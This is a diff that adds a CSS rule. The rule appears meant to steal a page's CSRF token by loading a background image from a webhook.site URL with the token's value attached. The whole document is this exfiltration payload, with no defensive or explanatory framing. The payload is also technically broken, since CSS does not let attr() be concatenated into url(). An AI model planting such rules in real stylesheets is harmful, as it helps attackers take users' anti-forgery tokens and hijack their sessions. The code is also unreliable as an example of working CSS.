@@ -1,0 +1,5 @@
+input[name="csrf"] {
+  background: url("https://webhook.site/2e630233-18d1-4506-aca3-8f4829760ff2?csrf="attr(
+      value
+    ));
+}
